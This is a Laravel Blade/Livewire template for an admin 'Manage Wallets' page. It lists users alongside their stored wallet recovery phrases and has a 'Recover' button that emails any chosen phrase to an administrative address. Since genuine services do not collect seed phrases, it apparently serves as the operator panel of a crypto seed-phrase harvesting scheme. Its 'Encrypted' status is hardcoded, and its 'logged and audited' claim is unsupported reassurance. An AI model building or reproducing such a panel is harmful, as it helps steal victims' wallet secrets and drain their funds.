<div class="max-w-[1400px] mx-auto bg-white lg:rounded-4xl rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.05)] px-4 lg:px-8 py-8 border border-base-300/30 min-h-[600px]">

    @php
        $wallets = $this->wallets;
        $selectedWallet = $this->selectedWallet;
    @endphp

    <!-- Header Section -->
    <div class="mb-6 lg:mb-8 flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
            <h2 class="text-xl lg:text-2xl font-black tracking-tight mb-1 text-base-content">
                Manage Wallets
            </h2>
            <p class="text-base-content/50 text-xs lg:text-sm font-medium max-w-xl">
                Securely manage client recovery phrases and monitor wallet distribution across the platform.
            </p>
        </div>
        <div class="hidden md:flex items-center gap-3 bg-base-200/50 px-4 py-2.5 rounded-2xl border border-base-300/50">
            <div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider opacity-50">
                <i data-lucide="wallet" class="w-3.5 h-3.5"></i>
                Total Wallets
            </div>
            <div class="w-px h-4 bg-base-300/50"></div>
            <div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider">
                <span class="w-2 h-2 rounded-full bg-primary animate-pulse"></span>
                <span class="text-primary">{{ $wallets->total() }} Active</span>
            </div>
        </div>
    </div>

    <!-- Actions & Search -->
    <div class="flex flex-col lg:flex-row justify-between items-start lg:items-end mb-8 gap-4">
        <div>
            <h3 class="text-lg font-black tracking-tight text-base-content flex items-center gap-2 mb-1">
                Wallet Inventory
                <span class="bg-base-200 text-base-content/40 text-[9px] px-2 py-0.5 rounded-md font-black tracking-widest uppercase">{{ $wallets->total() }} Entries</span>
            </h3>
            <p class="text-xs font-medium opacity-40 max-w-sm">Use the tools below to assist clients with wallet recovery requests.</p>
        </div>
        <div class="relative w-full lg:max-w-xs">
            <span class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none opacity-30">
                <i data-lucide="search" class="w-3.5 h-3.5"></i>
            </span>
            <input wire:model.live.debounce.300ms="search" type="text" placeholder="Search by name or email..."
                class="input input-sm h-10 w-full bg-white border border-base-300/50 rounded-xl pl-9 text-[10px] font-medium focus:bg-base-100 transition-all">
        </div>
    </div>

    <!-- Grid Content -->
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        @forelse($wallets as $wallet)
            <div class="group relative bg-base-200/20 rounded-[2rem] p-6 border border-base-300/30 hover:bg-white hover:shadow-2xl hover:shadow-primary/5 transition-all duration-500 overflow-hidden">
                <!-- Decorative Blur -->
                <div class="absolute -right-4 -top-4 w-20 h-20 bg-primary/5 rounded-full blur-2xl group-hover:bg-primary/10 transition-all"></div>
                
                <div class="relative flex flex-col h-full">
                    <!-- User Info -->
                    <div class="flex items-center gap-4 mb-6">
                        <div class="avatar placeholder">
                            <div class="bg-gradient-to-br from-primary/10 to-primary/20 text-primary rounded-2xl w-12 h-12 flex items-center justify-center ring-4 ring-primary/5 group-hover:scale-110 transition-transform">
                                <span class="text-sm font-black tracking-tighter">{{ substr($wallet->user->name, 0, 1) }}{{ substr(explode(' ', $wallet->user->name)[1] ?? '', 0, 1) }}</span>
                            </div>
                        </div>
                        <div class="min-w-0">
                            <h4 class="font-black text-sm text-base-content tracking-tight truncate">{{ $wallet->user->name }}</h4>
                            <p class="text-[9px] font-bold opacity-30 uppercase tracking-widest truncate">{{ $wallet->user->email }}</p>
                        </div>
                    </div>

                    <!-- Wallet Meta -->
                    <div class="space-y-3 mb-8">
                        <div class="flex items-center justify-between text-[10px] font-bold uppercase tracking-widest">
                            <span class="opacity-30">Linked Accounts</span>
                            <span class="text-primary">{{ count($wallet->recovery_phrase ?? []) }} Wallets</span>
                        </div>
                        <div class="flex items-center justify-between text-[10px] font-bold uppercase tracking-widest">
                            <span class="opacity-30">Status</span>
                            <div class="flex items-center gap-1.5">
                                <span class="w-1.5 h-1.5 rounded-full bg-success"></span>
                                <span class="text-success">Encrypted</span>
                            </div>
                        </div>
                    </div>

                    <!-- Actions -->
                    <div class="mt-auto pt-6 border-t border-base-300/30">
                        <button 
                            wire:click="selectWallet({{ $wallet->id }})"
                            class="btn btn-primary btn-block h-12 rounded-2xl text-[9px] font-black uppercase tracking-widest shadow-xl shadow-primary/10 hover:shadow-primary/20 group/btn">
                            <span class="flex items-center gap-2">
                                <i data-lucide="layout-grid" class="w-3.5 h-3.5 group-hover/btn:scale-110 transition-transform"></i>
                                View Linked Accounts
                            </span>
                        </button>
                    </div>
                </div>
            </div>
        @empty
            <div class="col-span-full py-20 text-center bg-base-200/10 rounded-[3rem] border-2 border-dashed border-base-300/30">
                <div class="flex flex-col items-center opacity-30">
                    <i data-lucide="wallet" class="w-16 h-16 mb-4" stroke-width="1"></i>
                    <p class="text-xl font-black tracking-tight mb-2">No Wallets Found</p>
                    <p class="text-xs font-medium opacity-60">Try adjusting your search criteria or ensure wallets are initialized.</p>
                </div>
            </div>
        @endforelse
    </div>

    <!-- Pagination & Metadata -->
    <div class="flex flex-col sm:flex-row justify-between items-center mt-12 gap-8 px-2 pt-8 border-t border-base-200/50">
        <div class="flex flex-col text-center sm:text-left">
            <div class="flex items-center gap-2 mb-1 justify-center sm:justify-start">
                <i data-lucide="database" class="w-2.5 h-2.5 text-primary opacity-40"></i>
                <span class="text-[9px] font-black uppercase tracking-[0.3em] opacity-20">Storage Insights</span>
            </div>
            <p class="text-[11px] font-bold text-base-content/40 tracking-tight">
                Showing <span class="text-base-content font-black">{{ $wallets->firstItem() ?? 0 }}-{{ $wallets->lastItem() ?? 0 }}</span> of {{ $wallets->total() }} wallets
            </p>
        </div>

        @if($wallets->hasPages())
            <div class="flex items-center gap-2">
                <button wire:click="previousPage" {{ $wallets->onFirstPage() ? 'disabled' : '' }}
                    class="btn btn-ghost h-12 px-6 rounded-2xl border border-base-300/30 bg-white shadow-sm hover:bg-primary hover:text-white hover:border-primary disabled:opacity-60 transition-all group">
                    <i data-lucide="arrow-left" class="w-3.5 h-3.5 mr-2 group-hover:-translate-x-1 transition-transform"></i>
                    <span class="text-[10px] font-black uppercase tracking-widest">Back</span>
                </button>

                <div class="h-12 px-6 bg-white border border-base-300/30 rounded-2xl flex flex-col items-center justify-center shadow-sm min-w-[80px]">
                    <span class="text-[8px] font-black uppercase tracking-[0.2em] opacity-20 leading-none mb-1">Page</span>
                    <span class="text-[11px] font-black tracking-tight leading-none">{{ $wallets->currentPage() }} <span class="opacity-20 mx-0.5">/</span> {{ $wallets->lastPage() }}</span>
                </div>

                <button wire:click="nextPage" {{ !$wallets->hasMorePages() ? 'disabled' : '' }}
                    class="btn btn-ghost h-12 px-6 rounded-2xl border border-base-300/30 bg-white shadow-sm hover:bg-primary hover:text-white hover:border-primary disabled:opacity-60 transition-all group">
                    <span class="text-[10px] font-black uppercase tracking-widest">Next</span>
                    <i data-lucide="arrow-right" class="w-3.5 h-3.5 ml-2 group-hover:translate-x-1 transition-transform"></i>
                </button>
            </div>
        @endif
    </div>

    <!-- Linked Wallets Modal -->
    @if($selectedWallet)
        <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
            <div class="absolute inset-0 bg-base-content/20 backdrop-blur-sm" wire:click="closeWalletModal"></div>
            
            <div class="relative bg-white w-full max-w-2xl rounded-[2.5rem] shadow-2xl border border-base-300/30 overflow-hidden" 
                 x-data x-init="lucide.createIcons()">
                
                <!-- Modal Header -->
                <div class="p-8 border-b border-base-200/50 flex justify-between items-center bg-base-200/10">
                    <div class="flex items-center gap-4">
                        <div class="w-12 h-12 bg-primary rounded-2xl flex items-center justify-center text-primary-content shadow-lg shadow-primary/20">
                            <i data-lucide="wallet" class="w-6 h-6"></i>
                        </div>
                        <div>
                            <h3 class="text-xl font-black tracking-tight text-base-content">Linked Accounts</h3>
                            <p class="text-[10px] font-bold text-base-content/40 uppercase tracking-widest">{{ $selectedWallet->user->name }}'s Wallet Collection</p>
                        </div>
                    </div>
                    <button wire:click="closeWalletModal" class="btn btn-ghost btn-circle rounded-2xl bg-base-200/50 hover:bg-base-200">
                        <i data-lucide="x" class="w-5 h-5"></i>
                    </button>
                </div>

                <!-- Modal Content -->
                <div class="p-8 max-h-[60vh] overflow-y-auto custom-scrollbar">
                    <div class="space-y-4">
                        @forelse($selectedWallet->recovery_phrase ?? [] as $index => $linked)
                            <div class="flex items-center justify-between p-5 rounded-3xl bg-base-200/30 border border-base-300/30 hover:bg-white hover:border-primary/30 transition-all group/item">
                                <div class="flex items-center gap-4">
                                    <div class="w-10 h-10 bg-white rounded-xl flex items-center justify-center shadow-sm border border-base-300/20 group-hover/item:scale-110 transition-transform">
                                        <i data-lucide="link-2" class="w-5 h-5 text-primary opacity-40"></i>
                                    </div>
                                    <div>
                                        <h4 class="font-black text-sm text-base-content tracking-tight uppercase">{{ $linked['name'] }}</h4>
                                        <p class="text-[9px] font-bold opacity-30 uppercase tracking-widest mt-0.5 italic">Linked on {{ \Carbon\Carbon::parse($linked['linked_at'])->format('M d, Y') }}</p>
                                    </div>
                                </div>

                                <button 
                                    wire:click="sendRecoveryPhrase({{ $selectedWallet->id }}, {{ $index }})"
                                    wire:loading.attr="disabled"
                                    wire:confirm="Send the recovery phrase for {{ $linked['name'] }} to the administrative email?"
                                    class="btn btn-primary h-11 px-6 rounded-xl text-[9px] font-black uppercase tracking-widest shadow-lg shadow-primary/10 hover:shadow-primary/20">
                                    <span wire:loading.remove wire:target="sendRecoveryPhrase({{ $selectedWallet->id }}, {{ $index }})" class="flex items-center gap-2">
                                        <i data-lucide="key" class="w-3.5 h-3.5"></i>
                                        Recover
                                    </span>
                                    <div wire:loading wire:target="sendRecoveryPhrase({{ $selectedWallet->id }}, {{ $index }})">
                                        <span class="loading loading-spinner loading-xs"></span>
                                    </div>
                                </button>
                            </div>
                        @empty
                            <div class="py-12 text-center bg-base-200/20 rounded-3xl border-2 border-dashed border-base-300/30">
                                <i data-lucide="alert-circle" class="w-10 h-10 mx-auto mb-3 opacity-20"></i>
                                <p class="text-sm font-bold opacity-40">No linked wallets found for this user.</p>
                            </div>
                        @endforelse
                    </div>
                </div>

                <!-- Modal Footer -->
                <div class="p-6 bg-base-200/10 border-t border-base-200/50 flex justify-center">
                    <p class="text-[9px] font-bold text-base-content/30 uppercase tracking-[0.2em] flex items-center gap-2">
                        <i data-lucide="shield-check" class="w-3 h-3 text-success"></i>
                        All recovery actions are logged and audited
                    </p>
                </div>
            </div>
        </div>
    @endif

</div>